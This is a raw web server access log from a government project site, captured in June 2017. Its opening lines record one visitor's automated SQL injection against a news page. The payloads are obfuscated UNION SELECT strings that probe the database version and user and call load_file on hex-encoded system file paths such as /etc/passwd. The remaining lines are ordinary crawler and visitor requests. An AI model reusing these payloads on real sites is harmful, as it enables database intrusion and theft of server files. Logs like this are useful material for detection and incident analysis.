96.47.238.139 - - [24/Jun/2017:07:37:54 +0530] "POST /detail_news.php?id=999999.9+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39,0x39313335313435363233352e39 HTTP/1.1" 200 18056 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39,0x393133353134353632362e39,0x393133353134353632372e39,0x393133353134353632382e39,0x393133353134353632392e39,0x39313335313435363231302e39,0x39313335313435363231312e39,0x39313335313435363231322e39,0x39313335313435363231332e39,0x39313335313435363231342e39,0x39313335313435363231352e39,0x39313335313435363231362e39,0x39313335313435363231372e39,0x39313335313435363231382e39,0x39313335313435363231392e39,0x39313335313435363232302e39,0x39313335313435363232312e39,0x39313335313435363232322e39,0x39313335313435363232332e39,0x39313335313435363232342e39,0x39313335313435363232352e39,0x39313335313435363232362e39,0x39313335313435363232372e39,0x39313335313435363232382e39,0x39313335313435363232392e39,0x39313335313435363233302e39,0x39313335313435363233312e39,0x39313335313435363233322e39,0x39313335313435363233332e39,0x39313335313435363233342e39,0x39313335313435363233352e39" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:04 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39+and+'0'='0 HTTP/1.1" 200 11643 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:05 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39+and+'0'='0 HTTP/1.1" 200 11643 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:06 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39+and+'0'='0 HTTP/1.1" 200 11643 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:06 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39+and+'0'='0 HTTP/1.1" 200 11643 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:07 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39+and+'0'='0 HTTP/1.1" 200 18134 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+0x393133353134353632312e39,0x393133353134353632322e39,0x393133353134353632332e39,0x393133353134353632342e39,0x393133353134353632352e39+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:11 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18134 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:13 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18134 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:14 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fuSeR(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18149 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fuSeR(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:15 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18134 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2fvErSiOn(),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:19 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x2f6574632f706173737764),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18122 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x2f6574632f706173737764),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:20 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a5c5c626f6f742e696e69),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18122 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a5c5c626f6f742e696e69),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:22 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x643a5c5c626f6f742e696e69),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18122 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x643a5c5c626f6f742e696e69),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
64.233.173.49 - - [24/Jun/2017:07:38:25 +0530] "GET /imp_links.php HTTP/1.1" 200 17836 "http://www.cdmindia.gov.in/approved_projects.php?n=1" "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
96.47.238.139 - - [24/Jun/2017:07:38:32 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f2f626f6f742e696e69),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18122 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f2f626f6f742e696e69),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
96.47.238.139 - - [24/Jun/2017:07:38:33 +0530] "POST /detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f626f6f742e696e69),0x217e21),4,5+and+'0'='0 HTTP/1.1" 200 18122 "http://www.cdmindia.gov.in/detail_news.php?id=999999.9'+%2f**%2fuNiOn%2f**%2faLl+%2f**%2fsElEcT+1,2,%2f**%2fcOnCaT(0x217e21,%2f**%2flOaD_FiLe(0x633a2f626f6f742e696e69),0x217e21),4,5+and+'0'='0" "Mozilla/5.0 (Windows; U; Windows NT 5.1; pt-PT; rv:1.9.1.2) Gecko/20090729 Firefox/3.5.2 (.NET CLR 3.5.30729)"
66.249.69.79 - - [24/Jun/2017:07:38:51 +0530] "GET /project_details_view_report.php?id=1800 HTTP/1.1" 200 13156 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
35.184.189.105 - - [24/Jun/2017:07:42:27 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [24/Jun/2017:07:44:27 +0530] "GET /project_details_view_report.php?id=830 HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
64.233.173.51 - - [24/Jun/2017:07:51:38 +0530] "GET /approved_projects.php?n=1 HTTP/1.1" 200 16644 "http://www.cdmindia.gov.in/approval_process.php" "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
202.46.50.160 - - [24/Jun/2017:07:54:28 +0530] "GET /project_details_view.php?id=865 HTTP/1.1" 200 14648 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
168.235.197.52 - - [24/Jun/2017:07:57:26 +0530] "GET /project_details_view.php?id=362 HTTP/1.1" 200 14189 "http://www.google.co.in/search?hl=en&ie=ISO-8859-1&q=Samsung+project+details+" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
168.235.197.52 - - [24/Jun/2017:07:57:27 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 304 - "http://www.cdmindia.gov.in/project_details_view.php?id=362" "UCWEB/2.0 (Java; U; MIDP-2.0; Nokia203/20.37) U2/1.0.0 UCBrowser/8.7.0.218 U2/1.0.0 Mobile"
23.88.37.115 - - [24/Jun/2017:07:59:22 +0530] "GET / HTTP/1.1" 200 19482 "http://www.domain2008.com/domains/www.cdmindia.gov.in" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)"
157.55.39.174 - - [24/Jun/2017:08:00:07 +0530] "GET /project_details_view.php?id=692 HTTP/1.1" 200 14238 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
64.233.173.49 - - [24/Jun/2017:08:03:21 +0530] "GET /approved_projects.php?n=1 HTTP/1.1" 200 16644 "http://www.cdmindia.gov.in/approval_process.php" "Mozilla/5.0 (Linux; Android 6.0.1; vivo 1603 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
157.55.39.239 - - [24/Jun/2017:08:03:39 +0530] "GET /project_details_view_report.php?id=1834 HTTP/1.1" 200 13222 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.79.91 - - [24/Jun/2017:08:04:38 +0530] "GET /detail_news.php?id=19 HTTP/1.1" 302 19084 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.91 - - [24/Jun/2017:08:04:39 +0530] "GET /logout.php HTTP/1.1" 302 369 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.93 - - [24/Jun/2017:08:04:40 +0530] "GET /index.php HTTP/1.1" 200 19482 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.50.11.109 - - [24/Jun/2017:08:04:59 +0530] "GET /project_details_view.php?id=766 HTTP/1.1" 200 14801 "https://www.google.co.in/" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:04:59 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:04:59 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:04:59 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/favicon.ico HTTP/1.1" 200 1406 "-" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:00 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:02 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
157.50.11.109 - - [24/Jun/2017:08:05:02 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=766" "Mozilla/5.0 (Windows NT 6.1; rv:54.0) Gecko/20100101 Firefox/54.0"
35.184.189.105 - - [24/Jun/2017:08:05:54 +0530] "GET /robots.txt HTTP/1.1" 404 208 "-" "ltx71 - (http://ltx71.com/)"
66.249.79.15 - - [24/Jun/2017:08:06:19 +0530] "GET /reports_list_details.php?id=1&reporttype=1&page=229 HTTP/1.1" 200 17812 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.102.6.111 - - [24/Jun/2017:08:09:15 +0530] "GET /project_details_view.php?id=930 HTTP/1.1" 200 16546 "https://www.google.co.in/" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.253 - - [24/Jun/2017:08:09:16 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [24/Jun/2017:08:09:31 +0530] "GET /project_details_view.php?id=930 HTTP/1.1" 200 16546 "-" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [24/Jun/2017:08:09:32 +0530] "GET /images/bullet1.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [24/Jun/2017:08:09:32 +0530] "GET /images/spacer.gif HTTP/1.1" 200 43 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [24/Jun/2017:08:09:32 +0530] "GET /images/fdm.jpg HTTP/1.1" 200 2043 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.252 - - [24/Jun/2017:08:09:32 +0530] "GET /Scripts/AC_RunActiveContent.js HTTP/1.1" 200 8321 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.111 - - [24/Jun/2017:08:09:32 +0530] "GET /images/gtz.jpg HTTP/1.1" 200 15484 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [24/Jun/2017:08:09:32 +0530] "GET /images/bulllet2.gif HTTP/1.1" 200 58 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [24/Jun/2017:08:09:32 +0530] "GET /ncdma.css HTTP/1.1" 200 12640 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [24/Jun/2017:08:09:33 +0530] "GET /images/bullet4.gif HTTP/1.1" 200 67 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.253 - - [24/Jun/2017:08:09:32 +0530] "GET /images/img3.jpg HTTP/1.1" 200 26957 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [24/Jun/2017:08:09:32 +0530] "GET /images/img2.jpg HTTP/1.1" 200 16276 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.113 - - [24/Jun/2017:08:09:33 +0530] "GET /includes/ncdma.css HTTP/1.1" 200 13023 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.6.115 - - [24/Jun/2017:08:09:33 +0530] "GET /images/fbg.jpg HTTP/1.1" 200 325 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
66.102.7.253 - - [24/Jun/2017:08:09:33 +0530] "GET /images/img1.jpg HTTP/1.1" 200 1251 "http://www.cdmindia.gov.in/project_details_view.php?id=930" "Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19"
202.46.57.72 - - [24/Jun/2017:08:14:18 +0530] "GET /project_details_view.php?id=2149&oid=1&page=1&reporttype=1 HTTP/1.1" 200 13619 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.79.17 - - [24/Jun/2017:08:21:17 +0530] "GET /project_details_view.php?id=1149&oid=&page=52&reporttype= HTTP/1.1" 200 14138 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
157.55.39.84 - - [24/Jun/2017:08:25:24 +0530] "GET /Approved_proj_reports_list_details.php?id=1&reporttype=1&scale=&sdt=&edt=&exec=&page=3 HTTP/1.1" 200 16750 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.84 - - [24/Jun/2017:08:26:55 +0530] "GET /downloads/New%20PCN.doc HTTP/1.1" 200 435200 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.84 - - [24/Jun/2017:08:26:58 +0530] "GET /downloads/Comparision%20of%20PCN_30.03.doc HTTP/1.1" 200 49664 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.239 - - [24/Jun/2017:08:27:14 +0530] "GET /project_details_view_report.php?id=1347 HTTP/1.1" 200 13596 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
68.180.228.167 - - [24/Jun/2017:08:30:54 +0530] "GET /capacity_building.php HTTP/1.1" 200 19188 "-" "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)"
202.46.56.188 - - [24/Jun/2017:08:34:08 +0530] "GET /project_details_view_report.php?id=1073 HTTP/1.1" 200 13375 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
66.249.69.83 - - [24/Jun/2017:08:36:48 +0530] "GET /project_details_view.php?id=246 HTTP/1.1" 200 14771 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.79.17 - - [24/Jun/2017:08:36:48 +0530] "GET /project_details_view.php?id=246 HTTP/1.1" 200 14771 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
